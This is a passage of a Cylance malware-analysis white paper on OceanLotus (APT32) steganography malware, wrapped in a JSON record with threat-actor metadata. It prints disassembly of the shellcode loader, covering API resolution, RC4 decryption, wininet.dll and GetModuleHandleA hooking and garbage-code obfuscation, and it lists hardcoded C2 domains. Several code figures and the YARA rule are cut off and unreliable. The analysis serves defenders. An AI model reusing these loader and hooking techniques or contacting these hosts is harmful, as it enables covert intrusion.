FF .«ÿ1.1‹øÆ³ÌÏL[™]¶ÿ\n 022A0070 66 08 BF 5A BD 98 67 CF AD EF 78 0C 44 71 3C E6 f.¿Z½˜gÏ­ïx.Dq<æ\n 022A0080 D2 76 B9 A0 60 42 82 64 2F EC 40 26 FB 88 BF D9 Òv¹ `B‚d/ì@&ûˆ¿Ù\n 022A0090 37 1A C0 81 38 97 6F A5 4E F6 4D B2 21 66 DD B3 7.À.8—o¥NöM²!fÝ³\n 022A00A0 58 CF 19 DA 90 FF 79 35 CC 08 D4 03 61 E1 B3 8F XÏ.Ú.ÿy5Ì.Ô.aá³.\n 022A00B0 07 CA CB 01 55 61 63 AA 4B 08 85 71 E6 4B D0 6F .ÊË.UacªK.…qæKÐo\n 022A00C0 8E 27 C7 F7 58 1E 6E 81 B2 8A 4B 42 FD 2B F9 96 Ž›Ç÷X.n.²ŠKBý+ù–\n 022A00D0 10 13 55 08 B5 82 05 C4 FE A4 0C FF DB 1A FF 1E ..U.µ‚.Äþ¤.ÿÛ.ÿ.\n 022A00E0 69 5D 3B 47 3B D6 DF 9C D9 93 31 FF F8 78 D3 6A i];G;ÖßœÙ“1ÿøxÓj\n 022A00F0 4D 65 10 CC B3 A5 68 BE FC 76 CA 17 E2 96 C7 B1 Me.Ì³¥h¾üvÊ.â–Ç±\n 022A0100 49 93 99 3D 3F 31 63 14 57 DF 08 C2 CF 87 76 C9 I“[™]=?1c.Wß.ÂÏ‡vÉ\n 022A0110 F1 E9 76 CE F2 C6 F5 F3 65 D4 C0 B4 99 26 4D DC ñévÎòÆõóeÔÀ´[™]&MÜ\n 022A0120 31 3D F8 18 F8 71 BB 0E 1F BA 0E 00 B4 09 CD 21 1=ø.øq»..º..´.Í!\n 022A0130 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 ¸.LÍ!This progra\n 022A0140 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 6E 20 m cannot be run\n 022A0150 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0D 0A 24 in DOS mode....$\n\n#### Figure 28. DOS stub in payload\n\n```\n\n-----\n\n#### described in the ESET white paper on OceanLotus[4]):\n```\n debug053:024098B2         pushf\n debug053:024098B3         push  ebx\n debug053:024098B4         push  edx\n debug053:024098B5         xadd  edx, ebx\n debug053:024098B8         push  ecx\n debug053:024098B9         mov   dh, ch\n debug053:024098BB         stc\n debug053:024098BC         push  eax\n debug053:024098BD         dec   eax\n debug053:024098BE         bswap  edx\n debug053:024098C0         bt   ecx,\n debug053:024098C4         cwd\n debug053:024098C6         das\n debug053:024098C7         not   al\n debug053:024098C9         test  ax,\n debug053:024098CD         stc\n debug053:024098CE         not   ecx\n debug053:024098D0         shl   bh, 3\n debug053:024098D3         shl   ax, 1\n debug053:024098D6         add   ah, bh\n debug053:024098D8         aad\n debug053:024098DA         inc   dl\n debug053:024098DC         aas\n debug053:024098DD         not   ecx\n debug053:024098DF         mov   eax,\n debug053:024098E4         mov   ecx,\n debug053:024098E9         mul   ecx\n debug053:024098EB         mov   edx, [esp+\n debug053:024098EF         nop\n debug053:024098F0         bsf   cx, ax\n debug053:024098F4         daa\n debug053:024098F5         dec   ebx\n debug053:024098F6         mov   ebx, [esp+\n debug053:024098FA         sar   cx, 4\n debug053:024098FE         mov   ecx, [esp+\n debug053:02409902         stc\n debug053:02409903         neg   eax\n debug053:02409905         mov   eax, [esp+\n debug053:02409909         push  eax\n debug053:0240990A         popf\n\n Figure 29. Garbage opcodes\n\n```\n\n-----\n\n#### Figure 30. Walk modules\n```\n debug053:024088B1        \n debug053:024088B4        \n debug053:024088B7        \n\n Figure 31. Find module\n debug053:0240898D        \n debug053:02408994        \n debug053:0240899B        \n debug053:024089A2        \n debug053:02409C85\n debug053:02409C85\n debug053:02409C85\n debug053:02409C85        \n debug053:02409C8C        \n debug053:02409C93        \n debug053:02409C9A        \n debug053:02409CA1        \n debug053:02409CA8        \n debug053:02409CAF        \n debug053:02409CB6        \n\n Figure 32. Check for kernel32.dll\n\n```\n\n-----\n\n#### them to resolve other necessary APIs, which include VirtualAlloc, RtlMoveMemory, and RtlZeroMemory:\n```\n debug053:0240947C found_kernel32:             ; CODE XREF: sub_2407AEF+87D↑j\n debug053:0240947C                     ; sub_2407AEF+889↑j\n debug053:0240947C         mov   ecx, [ecx+_LDR_DATA_TABLE_ENTRY.DllBase]\n debug053:0240947F         mov   [ebp-10h], ecx\n debug053:02409482         mov   dword ptr [ebp-56Ch], ‘daoL’\n debug053:0240948C         mov   dword ptr [ebp-568h], ‘rbiL’\n debug053:02409496         mov   eax, [ecx+IMAGE_DOS_HEADER.e_lfanew]\n debug053:02409499         mov   dword ptr [ebp-564h], ‘Ayra’\n debug053:024094A3         mov   [ebp-560h], ebx\n debug053:024094A9         mov   dword ptr [ebp-57Ch], ‘PteG’\n debug053:024094B3         mov   eax, [eax+ecx+IMAGE_NT_HEADERS32.OptionalHeader.DataDirectory.VirtualAddress\n ; export table\n debug053:024094B7         add   eax, ecx\n debug053:024094B9         mov   dword ptr [ebp-578h], ‘Acor’\n debug053:024094C3         mov   dword ptr [ebp-574h], ‘erdd’\n debug053:024094CD         mov   dword ptr [ebp-570h], ‘ss’\n debug053:024094D7         mov   esi, [eax+IMAGE_EXPORT_DIRECTORY.AddressOfNames]\n debug053:024094DA         add   esi, ecx\n debug053:024094DC         mov   [ebp-20h], esi\n debug053:024094DF         mov   esi, [eax+IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals\n debug053:024094E2         add   esi, ecx\n debug053:024094E4         mov   [ebp-8], esi\n debug053:024094E7         mov   esi, [eax+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]\n debug053:024094EA         mov   eax, [eax+IMAGE_EXPORT_DIRECTORY.NumberOfNames]\n\n Figure 33. Resolve kernel32.dll imports\n debug053:02409942         mov   dword ptr [ebp-58Ch], ‘triV’\n debug053:0240994C         push  eax\n debug053:0240994D         push  edx\n debug053:0240994E         mov   dword ptr [ebp-588h], ‘Alau’\n debug053:02409958         jmp   loc_2409055\n debug053:02409055 ; -------------------------------------------------------------------------- debug053:02409055\n debug053:02409055 loc_2409055:              ; CODE XREF: sub_2407AEF+1E69↓j\n debug053:02409055         mov   dword ptr [ebp-584h], ‘coll’\n debug053:0240905F         mov   [ebp-580h], ebx\n debug053:02409065         call  edi       ; GetProcAddress\n\n Figure 34. VirtualAlloc string constructed on the stack\n 0027F270 54 37 EC 88 93 C9 8A 55 CE 69 3C 00 52 74 6C 5A T7ìˆ“ÉŠUÎi<.RtlZ\n 0027F280 65 72 6F 4D 65 6D 6F 72 79 00 00 00 52 74 6C 4D eroMemory...RtlM\n 0027F290 6F 76 65 4D 65 6D 6F 72 79 00 00 00 56 69 72 74 oveMemory...Virt\n 0027F2A0 75 61 6C 41 6C 6C 6F 63 00 00 00 00 47 65 74 50 ualAlloc....GetP\n 0027F2B0 72 6F 63 41 64 64 72 65 73 73 00 00 4C 6F 61 64 rocAddress..Load\n 0027F2C0 4C 69 62 72 61 72 79 41 00 00 00 00 87 05 51 CF LibraryA....‡.QÏ\n\n Figure 35. Shellcode imports\n\n```\n\n-----\n\n#### each section and their header, are decrypted separately using RC4 algorithm and a hardcoded key:\n```\n debug053:02408C28 decrypt_pe_header:           ; CODE XREF: sub_2407AEF+10AC↑j\n debug053:02408C28         movzx  eax, byte ptr [ebp-5AFh]\n debug053:02408C2F         mov   [ebp+eax-6B0h], cl\n debug053:02408C36         mov   bl, [ebp-5AFh]\n debug053:02408C3C         mov   dl, [ebp-5B0h]\n debug053:02408C42         movzx  ecx, bl\n debug053:02408C45         movzx  eax, dl\n debug053:02408C48         mov   cl, [ebp+ecx-6B0h]\n debug053:02408C4F         add   cl, [ebp+eax-6B0h]\n debug053:02408C56         movzx  eax, cl\n debug053:02408C59         movzx  eax, byte ptr [ebp+eax-6B0h]\n debug053:02408C61         mov   al, [ebp+eax-35Ch]\n debug053:02408C68         xor   [ebp+esi-7E8h], al\n debug053:02408C6F         inc   esi\n debug053:02408C70         cmp   esi, 0F8h\n debug053:02408C76         jl   decrypt_PE_header_loop\n\n Figure 36. Fragment of code for RC4 decryption of PE header\n\n Once all sections are loaded, the relocations get fixed and the MZ/PE headers are zeroed out in memory:\n debug053:02409E32 find_reloc:               ; CODE XREF: sub_2407AEF+236C↓j\n debug053:02409E32         movzx  eax, cx\n debug053:02409E35         imul  eax, 28h\n debug053:02409E38         cmp   dword ptr [eax+edx], ‘ler.’\n debug053:02409E3F         jnz   loc_2409E53\n debug053:02409E45         cmp   dword ptr [eax+edx+4], ‘co’\n debug053:02409E4D         jz   loc_2409EDA\n debug053:02409F18         mov   eax, edx\n debug053:02409F1A         mov   dword ptr [ebp-0Ch], 3000h\n debug053:02409F21         and   eax, 0F000h\n debug053:02409F26         cmp   [ebp-0Ch], ax\n debug053:02409F2A         jnz   loc_2409797\n debug053:02409F30         mov   edi, [ebp-8]\n debug053:02409F33         and   edx, 0FFFh\n debug053:02409F39         add   edx, [ecx]   ; Fixup relocations\n\n Figure 37. Find .reloc section in loaded module\n\n The shellcode then proceeds to execute the payload DLL’s entry point:\n debug053:02409723\n debug053:02409723 loc_2409723:              ; CODE XREF: sub_2407AEF+27DB↓j\n debug053:02409723         mov   eax, [edi+IMAGE_NT_HEADERS32.OptionalHeader.AddressOfEntryPoint\n debug053:02409726         test  eax, eax\n debug053:02409728         jz   null_ep\n debug053:0240972E         push  ebx\n debug053:0240972F         push  1\n debug053:02409731         push  esi\n debug053:02409732         add   eax, esi\n debug053:02409734         call  eax       ; Call payload DLL entry-point\n debug053:02409736         test  eax, eax\n debug053:02409738         jz   exit\n debug053:0240973E         mov   [edi+28h], ebx\n\n Figure 38. Execute OEP of payload DLL\n\n```\n\n-----\n\n#### The Internal name of this DLL is a randomly looking CLSID and it only exports one function called DllEntry.\n```\n .rdata:00978B22 a79828cc5897943 db ‘{79828CC5-8979-43C0-9299-8E155B397281}.dll’,0\n .rdata:00978B4D aDllentry    db ‘DllEntry’,0     ; DATA XREF: .rdata:off_978B1C↑o\n\n Figure 39. DLL name and export\n\n Upon execution, the launcher will attempt to hook legitimate wininet.dll library by overwriting its entry point in memory with the address of a malicious routine. If successful, every time the system loads wininet.dll, the entry point of the subsequently dropped backdoor DLL will be executed before the original wininet entry point.\n\n```\n\n-----\n\n```\n .text:00906A5B         cmp   ecx, [ebp+wininet_base]\n .text:00906A5E         jnz   short check_next\n .text:00906A60         mov   edx, [ebp+LDR_DATA_TABLE_ENTRY]\n .text:00906A63         mov   eax, [edx+LDR_DATA_TABLE_ENTRY.EntryPoint]\n .text:00906A66         mov   wininet_oep, eax\n .text:00906A6B         mov   ecx, [ebp+LDR_DATA_TABLE_ENTRY]\n .text:00906A6E         mov   edx, [ebp+call_decrypted_dll_ep_ptr]\n .text:00906A71         mov   [ecx+LDR_DATA_TABLE_ENTRY.EntryPoint], edx ; ;\n .text:00906A71                     ; replace wininet.dll EP with\n .text:00906A71                     ; 0x08B31C0 call_decrypted_dll_ep\n .text:00906A74         jmp   short try_load_wininet\n .text:00906A76 ; -------------------------------------------------------------------------- .text:00906A76\n .text:00906A76 check_next:               ; CODE XREF: hook_wininet+6E↑j\n .text:00906A76         jmp   short find_wininet\n\n#### Figure 40. Routine that hooks wininet.dll\n .text:008B3108         mov   eax, [esp+scheduled_key]\n .text:008B310C         push  ebx\n .text:008B310D         push  ebp\n .text:008B310E         mov   ebp, [esp+8+payload]\n .text:008B3112         push  esi\n .text:008B3113         push  edi\n .text:008B3114         mov   edi, [esp+10h+out_buffer]\n .text:008B3118         mov   [esp+10h+size], ecx\n .text:008B311C         sub   ebp, edi\n .text:008B311E         mov   ecx, 1\n .text:008B3123\n .text:008B3123 decrypt_loop:              ; CODE XREF: rc4_crypt+79↓j\n .text:008B3123         add   [eax+100h], cl\n .text:008B3129         movzx  esi, byte ptr [eax+100h]\n .text:008B3130         movzx  edx, byte ptr [esi+eax]\n .text:008B3134         add   [eax+101h], dl\n .text:008B313A         movzx  ecx, byte ptr [eax+101h]\n .text:008B3141         mov   bl, [ecx+eax]\n .text:008B3144         mov   dl, [esi+eax]\n .text:008B3147         mov   [esi+eax], bl\n .text:008B314A         mov   [ecx+eax], dl\n .text:008B314D         movzx  ecx, byte ptr [eax+101h]\n .text:008B3154         movzx  ecx, byte ptr [ecx+eax]\n .text:008B3158         movzx  edx, byte ptr [eax+100h]\n .text:008B315F         add   cl, [edx+eax]\n .text:008B3162         movzx  edx, cl\n .text:008B3165         movzx  ecx, byte ptr [edx+eax]\n .text:008B3169         xor   cl, [edi+ebp]\n .text:008B316C         mov   [edi], cl\n .text:008B316E         mov   ecx, 1\n .text:008B3173         add   edi, ecx\n .text:008B3175         sub   [esp+10h+size], ecx\n .text:008B3179         jnz   short decrypt_loop\n\n Figure 41. Backdoor decryption routine\n\n```\n\n-----\n\n#### the pointers in the decompressed code, which is done on a one-by-one basis using hardcoded values and offsets. This part takes 90% of the whole launcher code and includes over 11,000 modifications:\n```\n .text:008B34CC loc_8B34CC:               ; CODE XREF: decrypt_decompress_fix_payload+1D3↑j\n .text:008B34CC         mov   ecx, [ebp+function_pointers]\n .text:008B34CF         push  ecx\n .text:008B34D0         call  [ebp+sub_904E10__call_comcritsect]\n .text:008B34D3         add   esp, 4\n .text:008B34D6         push  3E455Bh     ; difference\n .text:008B34DB         push  51D7FFh     ; destination offset\n .text:008B34E0         call  [ebp+sub_905F80__fix_pointer] ; 0x905F80 fix_pointer\n .text:008B34E3         add   esp, 8\n .text:008B34E6         mov   edx, [ebp+function_pointers]\n .text:008B34E9         push  edx\n .text:008B34EA         call  [ebp+sub_904E10__call_comcritsect]\n .text:008B34ED         add   esp, 4\n .text:008B34F0         push  31183h\n .text:008B34F5         push  4E246Dh\n .text:008B34FA         call  [ebp+sub_905F80__fix_pointer]\n .text:008B34FD         add   esp, 8\n .text:008B3500         mov   eax, [ebp+function_pointers]\n .text:008B3503         push  eax\n .text:008B3504         call  [ebp+sub_904E10__call_comcritsect]\n\n Figure 42. A fragment of code used for fixing pointers\n\n The launcher then calls the backdoor DLL’s entry point:\n .text:008E3966         call  get_dll_ep_ptr\n .text:008E396B         mov   [ebp+decompressed_dll_ep], eax\n .text:008E396E         cmp   [ebp+decompressed_dll_ep], 0\n .text:008E3972         jz   short loc_8E3982\n .text:008E3974         push  0\n .text:008E3976         push  1\n .text:008E3978         mov   ecx, decompressed_dll_ptr\n .text:008E397E         push  ecx\n .text:008E397F         call  [ebp+decompressed_dll_ep] ; 0x1665777 DllEntryPoint\n\n Figure 43. Call to the backdoor entry point\n\n```\n\n-----\n\n#### replacing the pointer to CComCriticalSection function with the pointer to that routine. Such an obfuscation method makes it difficult to spot it in the code:\n```\n .text:008E3982         mov   edx, [ebp+function_pointers]\n .text:008E3985         mov   eax, [edx+ptrs.CComCriticalSection_ptr]\n .text:008E3988         mov   [ebp+CComCriticalSection_ptr_cp], eax\n .text:008E398B         mov   ecx, [ebp+function_pointers]\n .text:008E398E         mov   edx, [ebp+function_pointers]\n .text:008E3991         mov   eax, [edx+ptrs.read_resources_ptr]\n .text:008E3994         mov   [ecx+ptrs.CComCriticalSection_ptr], eax ; replace function pointer\n .text:008E3997         mov   ecx, [ebp+function_pointers]\n .text:008E399A         push  ecx\n .text:008E399B\n .text:008E399B read_rsrc:            \n .text:008E399B         call  [ebp+sub_904E10__call_comcritsect] ; call_read_resources\n .text:008E399E         add   esp, 4\n .text:008E39A1         mov   edx, [ebp+function_pointers]\n .text:008E39A4         mov   eax, [ebp+CComCriticalSection_ptr_cp]\n .text:008E39A7         mov   [edx+ptrs.CComCriticalSection_ptr], eax ; restore original pointer\n\n Figure 44. Obfuscated call to resources decryption routine\n\n The launcher loads configuration from resources and uses an export from the backdoor DLL to initialize config values in memory.\n\n Resource P1/1 contains config values, including port number and a registry path:\n .rsrc:0097B108 res_P1_1    dd 0, 230FD6D4h, 0E14E775h, 23358h, 0FFFFFFFFh, 14h dup(0)\n .rsrc:0097B108         dd 8, 1138CCECh, 60h, 8E7C0003h, 0A8626E59h, 20926E73h\n .rsrc:0097B108         dd 0FBEDE54Eh, 3D70648Fh, 9DB1247Fh, 0E314700Ch, 0DEE5DA86h, 9C70A7FFh\n .rsrc:0097B108         dd 0AAB010CEh, 0EFB573BDh, 20B86F65h, 0BC325832h, 6E9BBE1Fh, 0F018C9A7h\n .rsrc:0097B108         dd 0FBC42E22h, 0FC18150Ah, 5B129A84h, 84DFEEE9h, 0EE1BA8Dh, 0B81053E0h\n .rsrc:0097B108         dd 1DE06A6Ah, 36BAD01Dh, 8FD6E94Eh, 7175D957h, 0A264352Dh, 0F2B39453h\n .rsrc:0097B108         dd 8BCD3945h, 7Ah, 0E2h dup(0)\n .rsrc:0097B574         dd 443\n .rsrc:0097B578         text “UTF-16LE”, ‘SOFTWARE\\Classes\\CLSID\\{57C3E2E2-C18F-4ABF-BAAA-9D1’\n .rsrc:0097B578         text “UTF-16LE”, ‘7879AB029}’,0\n\n Figure 45. Embedded configuration\n\n Resource P1/2 contains list of C2 URLs:\n .rsrc:0097B5F4 res_P1_2    db ‘background.ristians.com:8888’,0Ah\n .rsrc:0097B5F4         db ‘enum.arkoorr.com:8531’,0Ah\n .rsrc:0097B5F4         db ‘worker.baraeme.com:8888’,0Ah\n .rsrc:0097B5F4         db ‘enum.arkoorr.com:8888’,0Ah\n .rsrc:0097B5F4         db ‘worker.baraeme.com:8531’,0Ah\n .rsrc:0097B5F4         db ‘plan.evillese.com:8531’,0Ah\n .rsrc:0097B5F4         db ‘background.ristians.com:8531’,0Ah\n .rsrc:0097B5F4         db ‘plan.evillese.com:8888’,0Ah,0\n\n Figure 46. Hardcoded C2 URLs\n\n```\n\n-----\n\n#### Figure 47. Compressed C2 communication library\n\n Configuration values from the resources are then passed as parameter to one of the backdoor’s functions in the following manner:\n```\n .text:0090612E         mov   [ebp+resource_2_urls], eax\n .text:00906131         cmp   [ebp+resource_2_urls], 0\n .text:00906135         jz   short loc_906150\n .text:00906137         cmp   [ebp+resource_2_size], 0\n .text:0090613B         jbe   short loc_906150\n .text:0090613D         mov   edx, [ebp+resource_2_size]\n .text:00906140         push  edx\n .text:00906141         mov   eax, [ebp+resource_2_urls]\n .text:00906144         push  eax\n .text:00906145         push  offset a9e3bd021B5ad49 ; “{9E3BD021-B5AD-49DE-AE93-F178329EE0FE}”\n .text:0090614A         call  [ebp+decr_dll_export_1_0x15DAA30]\n .text:0090614D         mov   [ebp+resource_size], eax\n\n Figure 48. Initialization of config values\n\n After the content of resource 0xC8 is decompressed, another function from the backdoor DLL is used to load the C2 communication module to the memory and call its “CreateInstance” export:\n .text:009062C6         lea   eax, [ebp+decompr_buffer]\n .text:009062C9         push  eax\n .text:009062CA         mov   ecx, [ebp+res_size]\n .text:009062CD         push  ecx\n .text:009062CE         mov   edx, [ebp+resource_C8h]\n .text:009062D1         push  edx\n .text:009062D2         call  decompress_second_mz\n .text:009062F2         mov   ecx, [ebp+mz_size]\n .text:009062F5         push  ecx\n .text:009062F6         push  0\n .text:009062F8         lea   ecx, [ebp+decompr_buffer]\n .text:009062FB         call  get_ptr\n .text:00906300         push  eax       ; ptr to decompressed resource\n .text:00906301         call  [ebp+decr_mz_export_2_0x15DBC70]\n\n Figure 49. Decompression of second DLL\n\n Finally, the launcher passes control to the main backdoor routine:\n .text:00906313         call  get_export_3_ptr\n .text:00906318         mov   [ebp+decr_mz_export_3_0x15D9130], eax\n .text:0090631B         cmp   [ebp+decr_mz_export_3_0x15D9130], 0\n .text:0090631F         jz   short endp\n .text:00906321         call  [ebp+decr_mz_export_3_0x15D9130]\n .text:00906324         mov   [ebp+var_20], eax\n\n Figure 50 Call to the main backdoor routine\n\n```\n\n-----\n\n#### Name Content Length Notes\n\n\n#### Backdoor DLL The backdoor DLL is stored in the .rdata section of the launcher, compressed with LZMA, and encrypted with RC4. The binary is heavily obfuscated with overlapping blocks of garbage code enclosed in pushf/popf instructions. The DllMain function replaces the pointer to GetModuleHandleA API with a pointer to hook routine that will return the base of the backdoor DLL when called with NULL as parameter (instead of returing the handle to the launcher DLL):\n```\n seg000:015B6B45 loc_15B6B45:              ; CODE XREF: hook_GetModuleHandleA+D↑j\n seg000:015B6B45         mov   [ebp+GetModuleHandleA], 0\n seg000:015B6B4C         lea   eax, GetModuleHandleA\n seg000:015B6B52         mov   [ebp+GetModuleHandleA], eax\n seg000:015B6B55         lea   eax, [ebp+flOldProtect]\n seg000:015B6B58         push  eax       ; lpflOldProtect\n seg000:015B6B59         push  PAGE_EXECUTE_READWRITE ; flNewProtect\n seg000:015B6B5B         push  4        ; dwSize\n seg000:015B6B5D         push  [ebp+GetModuleHandleA] ; lpAddress = 0x168509C GetModuleHandleA\n seg000:015B6B60         mov   [ebp+flOldProtect], 0\n seg000:015B6B67         call  ds:VirtualProtect\n seg000:015B6B6D         test  eax, eax\n seg000:015B6B6F         jz   ret_0\n seg000:015B6B75         mov   eax, [ebp+GetModuleHandleA]\n seg000:015B6B78         mov   dword ptr [eax], offset getmodhandle_hook\n seg000:015B6B7E         lea   eax, [ebp+flOldProtect]\n seg000:015B6B81         lea   esp, [esp+8+lpflOldProtect]\n\n Figure 51. Overwriting GetModuleHandleA pointer\n\n```\n\n-----\n\n```\n seg000:015B5F50 getmodhandle_hook proc near       ; DATA XREF: hook_GetModuleHandleA+58↓o\n seg000:015B5F50\n seg000:015B5F50 var_20     = dword ptr -20h\n seg000:015B5F50 var_C      = dword ptr -0Ch\n seg000:015B5F50 var_s0     = dword ptr 0\n seg000:015B5F50 lpModuleName  = dword ptr 8\n seg000:015B5F50\n seg000:015B5F50         push  ebp\n seg000:015B5F51         mov   ebp, esp\n seg000:015B5F53         mov   eax, [ebp+lpModuleName]\n seg000:015B5F56         test  eax, eax\n seg000:015B5F58         jz   loc_15B5F68\n seg000:015B5F5E         mov   [ebp+lpModuleName], eax\n seg000:015B5F61         pop   ebp\n seg000:015B5F62         jmp   ds:GetModuleHandleA_ptr\n seg000:015B5F68 ; -------------------------------------------------------------------------- seg000:015B5F68\n seg000:015B5F68 loc_15B5F68:              ; CODE XREF: getmodhandle_hook+8↑j\n seg000:015B5F68         mov   eax, offset base_addr\n seg000:015B5F6D         mov   ebp, [esp+var_s0]\n\n#### Figure 52. GetModuleHandleA hook\n\n The backdoor also contains an export that loads the C2 communication module reflectively to the memory from resource passed as parameter and then calls its “CreateInstance” export.\n\n While we are still in the process of analyzing this backdoor’s full functionality, it seems to be similar to the Remy backdoor described in our previous whitepaper on OceanLotus malware.\n\n C2 Communication Module This DLL is stored in the launcher’s resources and compressed with LZMA. It’s also heavily obfuscated, but in a slightly different way than the backdoor. Although it doesn’t contain an internal name, we believe it’s a variant of HttpProv library, as described in the ESET white paper on OceanLotus.\n\n This module is used by the backdoor during HTTP/HTTPS communication with the C2 server and has a proxy bypass functionality.\n\n```\n\n-----\n\n### pp\n\n#### Indicators of Compromise (IOCs)\n\n\n-----\n\n#### VirusTotal\n```\n AND tag:pedll\n\n YARA\n import “pe”\n {\n   meta:\n     description\n   strings:\n     $data1\n   condition:\\\n\n```\n// Must be MZ file\n```\n     uint16(\n\n```\nfilesize\n```\n     // Must be a DLL\n     pe.\n     pe.imports\n     pe.imports\n     pe.imports\n     for all of\n      (\n       $ in\n        (\n         pe\n         pe\n raw_data_size\n        )\n      )\n }\n\n##### +1-844-CYLANCE sales@cylance.com www.cylance.com\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/xcpoqhjuinsed58c8b36mo8omkf6ikcv",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.04.02.OceanLotus_Steganography/OceanLotus-Steganography-Malware-Analysis-White-Paper.pdf",
        "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/white-papers/OceanLotus-Steganography-Malware-Analysis-White-Paper.pdf"
    ],
    "report_names": [
        "Cylance_OceanLotus-Steganography-Malware-Analysis-White-Paper(04-02-2019)",
        "OceanLotus-Steganography-Malware-Analysis-White-Paper",
        "OceanLotus-Steganography-Malware-Analysis-White-Paper.pdf"
    ],
    "threat_actors": [
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f1518ac1-4710-4dd1-a422-e3801e4806cb",
            "created_at": "2024-05-01T02:03:08.147856Z",
            "updated_at": "2025-03-27T02:05:17.421275Z",
            "deleted_at": null,
            "main_name": "TIN WOODLAWN",
            "aliases": [
                "Cobalt Kitty",
                "OceanLotus",
                "WOODLAWN ",
                "APT32 "
            ],
            "source_name": "Secureworks:TIN WOODLAWN",
            "tools": [
                " Denis",
                " Goopy",
                " JEShell",
                " KerrDown",
                " Mimikatz",
                " Ratsnif",
                " Remy",
                " Rizzo",
                " RolandRAT",
                "Cobalt Strike"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041788,
    "ts_creation_date": 1553793460,
    "ts_modification_date": 1553793463,
    "files": {
        "pdf": "https://archive.orkl.eu/6645296c925133446d4e213a547235692761d5c2.pdf",
        "text": "https://archive.orkl.eu/6645296c925133446d4e213a547235692761d5c2.txt",
        "img": "https://archive.orkl.eu/6645296c925133446d4e213a547235692761d5c2.jpg"
    }
}